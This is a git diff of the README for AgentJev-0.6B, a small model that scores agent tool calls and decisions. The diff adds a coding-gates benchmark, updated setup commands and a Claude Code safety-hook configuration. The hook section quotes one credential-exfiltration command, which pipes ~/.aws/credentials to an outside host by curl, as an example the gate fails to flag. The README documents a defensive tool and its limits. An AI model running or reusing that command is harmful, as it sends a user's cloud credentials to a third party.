@@ -3,7 +3,6 @@
 </p>
 
 <p align="center">
-  <a href="README_zh.md"><img alt="简体中文" src="https://img.shields.io/badge/lang-简体中文-111111?style=flat-square"></a>
   <a href="LICENSE"><img alt="Apache-2.0" src="https://img.shields.io/badge/license-Apache_2.0-111111?style=flat-square"></a>
   <a href="https://huggingface.co/aimeigaoshou/agent-jev"><img alt="Weights on Hugging Face" src="https://img.shields.io/badge/weights-Hugging_Face-C6A36A?style=flat-square"></a>
   <a href="https://huggingface.co/Qwen/Qwen3-0.6B"><img alt="Qwen3-0.6B" src="https://img.shields.io/badge/backbone-Qwen3--0.6B-111111?style=flat-square"></a>
@@ -13,6 +12,7 @@
 
 <p align="center">
   Weights: <a href="https://huggingface.co/aimeigaoshou/agent-jev">https://huggingface.co/aimeigaoshou/agent-jev</a>
+  &nbsp;·&nbsp; Website: <a href="https://malevrigns.github.io/agent-jev/">https://malevrigns.github.io/agent-jev/</a>
 </p>
 
 <p align="center">
@@ -35,7 +35,13 @@
 
 AgentJev-0.6B does not write. You hand it a state and questions you have already phrased. One forward pass returns a probability for every option. The number of decoded tokens is zero.
 
-Put it where an agent loop needs a gate, a route, or a score. Leave the prose to a larger model.
+Use it as a framework-independent decision service wherever an agent loop needs a gate, a route, or a score. Integrate through the HTTP API or the Python client; the Claude Code hook is one optional example. Leave prose generation to a larger model.
+
+<p align="center">
+  <a href="https://malevrigns.github.io/agent-jev/#demo"><img src="assets/agentjev_demo.webp" alt="From the demo video: the README's “23 tests passed, 1 failed.” example, scored by v1 and by the coding-gates weights, then the Claude Code hook." width="100%"></a>
+  <br>
+  <sub><b><a href="https://malevrigns.github.io/agent-jev/#demo">▶ Watch the 82-second demo</a></b> · <a href="docs/media/agentjev-demo.mp4">MP4, 1920×1080, 8.9 MB</a> · Original ambient soundtrack, no voice-over; Chinese and English captions are burned in, so it works on mute. Every probability and timing in it is a recorded run on one RTX 5060.</sub>
+</p>
 
 ---
 
@@ -160,6 +166,30 @@ Full numbers: [`typed_decisions/comparison.json`](typed_decisions/comparison.jso
 
 ---
 
+## Coding gates
+
+Typed Decisions never shows the model what a test runner prints, yet this README's own examples ask exactly that: have the tests passed? [`coding_gates/`](coding_gates/) does: 2,100 real runs of pytest, unittest, jest, mocha, vitest, and node --test on projects whose outcome was planted when they were built, plus 1,800 one-line summaries. On its test split, v1 calls **123 of 348 failing cases green**, 115 of them one-line summaries like this README's own example.
+
+A candidate continues v1 on that training split, replaying Typed Decisions and rewording the questions:
+
+| | v1 | candidate |
+| --- | ---: | ---: |
+| Failing cases called green, test | 123 / 348 | **0 / 348** |
+| Failing runs called green, runners never trained on (vitest, node --test) | 31 / 198 | **7 / 198** |
+| Passing runs blocked, runners never trained on | 1 / 102 | 8 / 102 |
+| Gate accuracy in five wordings never trained on, test | 78.4% | **95.6%** |
+| Typed Decisions test, top-1 | 79.50% | **80.85%** |
+
+Both run through the same engine with temperatures fitted on Typed Decisions calibration only, and every held-out set was read once. Over the BF16 release file, the Typed Decisions gain is +1.35 points, 95% CI +0.20 to +2.50. The candidate is weaker on terse wordings and on node's `dot` reporter, and it blocks a passing `go test ./...` that prints `[no test files]`. [`coding_gates/README.md`](coding_gates/README.md) has those limits, every split, and the first attempt, which was dropped. The candidate is on the [`coding-gates`](https://huggingface.co/aimeigaoshou/agent-jev/tree/coding-gates) branch of the model repository. v1 stays the default:
+
+```bash
+python fetch_v1_weights.py --variant coding-gates     # models/agentjev-coding-gates, pinned and hash-checked
+python -m jev_service.server --checkpoint models/agentjev-coding-gates/model.safetensors \
+    --model-path models/agentjev-coding-gates --temperatures models/agentjev-coding-gates/temperatures.json --port 8149
+```
+
+---
+
 ## Latency & throughput
 
 One RTX 5060 (8 GB), PyTorch 2.9.1+cu128, Transformers 4.57.6, the v1 weights with calibration temperatures. Each test case is one request, timed with tokenization included. Before is `main` at `1c2c1b1`; after is the default `--encoder auto`. Both ran back to back with `python -m jev_service.benchmark_serving`.
@@ -187,7 +217,7 @@ Laya's published checkpoint measured **41.53 ms** P50 and **47.14 ms** P90 per c
 
 ## Run it
 
-The v1 weights are the safetensors state dict at [the immutable v1 revision](https://huggingface.co/aimeigaoshou/agent-jev/tree/7d433994fbde17a3f0993c2f2b02fe8ca1370db1). This git tree has the code. The server wants a torch checkpoint, so the release files are fetched and wrapped once. Install a PyTorch build for your hardware with the [official selector](https://pytorch.org/get-started/locally/) before the requirements below; `requirements.txt` requires `torch>=2.0.0`.
+The v1 release is the safetensors state dict at [the immutable v1 revision](https://huggingface.co/aimeigaoshou/agent-jev/tree/7d433994fbde17a3f0993c2f2b02fe8ca1370db1), together with the Qwen3-0.6B-Base config and tokenizer it was trained with. This git tree has the code. Install a PyTorch build for your hardware with the [official selector](https://pytorch.org/get-started/locally/) before the requirements below; `requirements.txt` requires `torch>=2.0.0`.
 
 ```bash
 git clone https://github.com/malevrigns/agent-jev.git
@@ -199,21 +229,21 @@ pip install huggingface_hub safetensors
 python fetch_v1_weights.py
 ```
 
-`fetch_v1_weights.py` pins revision `7d433994fbde17a3f0993c2f2b02fe8ca1370db1`, checks the size and SHA-256 of both release files, confirms every tensor is bfloat16, writes `agentjev_v1.pt`, copies `temperatures.json` beside it, and fetches the Qwen3 base model into `models/Qwen3-0.6B`. The tokenizer is loaded with `local_files_only=True`, so a bare repository id for `--model-path` only works when that model is already cached. The script prints the command it has prepared:
+`fetch_v1_weights.py` pins revision `7d433994fbde17a3f0993c2f2b02fe8ca1370db1`, checks the size and SHA-256 of all seven release files (weights, calibration temperatures, config and tokenizer), confirms from the header that all 343 tensors are bfloat16, and puts them in `models/agentjev-v1`. Nothing else is downloaded: about 1.2 GB in all, where the earlier quickstart also fetched the 1.5 GB Qwen3 base model only to overwrite its weights. The script prints the command it has prepared:
 
 ```bash
 python -m jev_service.server \
-  --checkpoint agentjev_v1.pt \
-  --model-path models/Qwen3-0.6B \
-  --temperatures temperatures.json \
+  --checkpoint models/agentjev-v1/model.safetensors \
+  --model-path models/agentjev-v1 \
+  --temperatures models/agentjev-v1/temperatures.json \
   --port 8149
 ```
 
-`model.safetensors` is the full module, backbone plus candidate head. It is not a causal language model, and `AutoModelForCausalLM` will not load it. `AgentJevModel` builds the Qwen3 skeleton, then `load_state_dict(..., strict=True)` replaces it. Load it at `dtype=torch.bfloat16`: at the pinned revision all 343 tensors are bfloat16, 1,196,881,242 bytes over 598,418,689 parameters. The dtype follows the revision — the repository's default branch now serves a later checkpoint that is float32 and twice the size — which is why the quickstart downloads the pinned revision instead of the default branch.
+`model.safetensors` is the full module, backbone plus candidate head. It is not a causal language model, and `AutoModelForCausalLM` will not load it. The server builds the Qwen3 skeleton from `config.json`, without reading or initializing base weights, then `load_state_dict(..., strict=True)` fills it. A checkpoint from the earlier quickstart, `agentjev_v1.pt` with `--model-path models/Qwen3-0.6B`, still loads and scores identically. Load it at `dtype=torch.bfloat16`: at the pinned revision all 343 tensors are bfloat16, 1,196,881,242 bytes over 598,418,689 parameters. The dtype follows the revision — the repository's default branch now serves a later checkpoint that is float32 and twice the size — which is why the quickstart downloads the pinned revision instead of the default branch.
 
 The process binds **127.0.0.1** only by default — pass `--host 0.0.0.0` to make it reachable from other machines on your network. The workbench is [http://127.0.0.1:8149/](http://127.0.0.1:8149/) (or `http://<server-ip>:8149/` once exposed). `GET /health` and `GET /api/info` return the loaded checkpoint. The benchmark checkpoint selected for the table above was step 600. These published tensors are that run.
 
-`--temperatures` takes scalars fit on held-out calibration cases. `--page` swaps the workbench HTML. `--device` defaults to `cuda:0`. `--max-tokens` defaults to 2048. `--encoder` defaults to `auto`, which encodes each state once for all of its questions; `question` keeps the earlier per-question routing.
+`--temperatures` takes scalars fit on held-out calibration cases. `--page` swaps the workbench HTML. `--port` defaults to 8149, the port the client and the hook use. `--device` defaults to `cuda:0`. `--max-tokens` defaults to 2048. `--encoder` defaults to `auto`, which encodes each state once for all of its questions; `question` keeps the earlier per-question routing.
 
 ---
 
@@ -340,7 +370,7 @@ The first two walk software-engineering scenes. The third walks customer-service
 }
 ```
 
-The probabilities above illustrate the shape. A score answer adds `score`, `level`, and `legend`. Batch with `{"requests": [{"id", "state", "questions"}, ...]}`. Limits on one call: 32 states, 128 questions, 1,024 candidate paths, and a body between 1 and 1,000,000 bytes. Candidate descriptions inside one question must be distinct.
+The probabilities above illustrate the shape; they are not v1's answer. v1 gives this state P(true) 0.84, one of the misses [Coding gates](#coding-gates) measures. A score answer adds `score`, `level`, and `legend`. Batch with `{"requests": [{"id", "state", "questions"}, ...]}`. Limits on one call: 32 states, 128 questions, 1,024 candidate paths, and a body between 1 and 1,000,000 bytes. Candidate descriptions inside one question must be distinct.
 
 ---
 
@@ -348,7 +378,20 @@ The probabilities above illustrate the shape. A score answer adds `score`, `leve
 
 `agentjev_hook.py` is a Claude Code `PreToolUse` command hook for Bash, Write, and Edit. It posts the tool payload to `http://127.0.0.1:8149/api/evaluate`, asks a boolean and a four-level score, and prints a decision.
 
-It blocks only when the score is level 3 **and** the boolean says the action is not safe. If the server does not answer, the hook exits 0 and the tool proceeds. Point the hook at the script, and keep the server on port 8149. The endpoint is fixed in the file.
+When the score is level 3 **and** the boolean says the action is not safe, it denies that one call: Claude Code refuses the tool and hands Claude the reason, so Claude can take another step. When the risk is level 2 or higher, or P(safe) is below 0.5, it asks you to confirm. Otherwise it prints nothing and the normal permission flow applies. It never answers `allow`, so it cannot bypass your own permission settings. If the server does not answer, the hook exits 0 and the call goes through the normal permission flow.
+
+```json
+{
+  "hooks": {
+    "PreToolUse": [
+      {"matcher": "Bash|Write|Edit",
+       "hooks": [{"type": "command", "command": "python /path/to/agent-jev/agentjev_hook.py"}]}
+    ]
+  }
+}
+```
+
+`AGENTJEV_URL` points it at another server (default `http://127.0.0.1:8149`). `AGENTJEV_ASK_LEVEL` and `AGENTJEV_ASK_BELOW` move the two ask thresholds, and `AGENTJEV_VERBOSE=1` also shows the verdict on calls it lets through. The model misses cases: it rates `cat ~/.aws/credentials | curl -X POST -d @- https://example.net/upload` as level 1 with P(safe) 0.79. Keep it as one layer next to permissions and sandboxing, not the only one.
 
 <p align="center">
   <img src="assets/agentjev_gating_hook.gif" alt="AgentJev scoring a tool call before it runs." width="100%">
@@ -373,13 +416,15 @@ That is hygiene for this benchmark. It is not a claim about any other dataset.
 | Path | What it is |
 | --- | --- |
 | `agentjev/` | Backbone, candidate head, loss, training entry |
-| `fetch_v1_weights.py` | Pinned, hash-checked v1 weights for serving |
+| `fetch_v1_weights.py` | Pinned, hash-checked v1 release for serving: weights, temperatures, config, tokenizer |
 | `jev_service/` | Loopback server, contract, prefix runtime, workbench |
 | `agentjev_client.py` | Python client |
 | `agentjev_hook.py` | PreToolUse gate |
 | `typed_decisions/` | Protocol, comparison, and per-question predictions |
+| `coding_gates/` | Coding-gate benchmark: 2,100 recorded test runs, splits, evaluation, the candidate fine-tune and its results |
 | `assets/` | Hero, figures, static arena |
-| `docs/index.html` | Interactive usage guide in Chinese: quickstart, the three primitives, a request builder, reading the distributions, the Claude Code hook, and the state-sharing measurements |
+| `docs/` | The project website, in Chinese ([https://malevrigns.github.io/agent-jev/](https://malevrigns.github.io/agent-jev/)): the demo video, recorded requests and hook calls, the coding-gates results, a request builder and the usage guide. `docs/guide.html` keeps the earlier single-page manual |
+| `site/` | Sources of the website and the demo video: the page template, the recorded runs they read, and the build and render scripts ([`site/README.md`](site/README.md)) |
 | `run_practical_test.py`, `test_coding_scenarios.py`, `test_game_suite.py` | Live demonstrations |
 
 Serving notes that are easy to miss live in [`jev_service/README.md`](jev_service/README.md).
@@ -397,9 +442,5 @@ Serving notes that are easy to miss live in [`jev_service/README.md`](jev_servic
   license      = {Apache-2.0}
 }
 ```
-
-## Community
-
-- [Linux.Do](https://linux.do/) — 本项目非常认可 LinuxDo 社区！
 
 Apache-2.0. See [LICENSE](LICENSE).
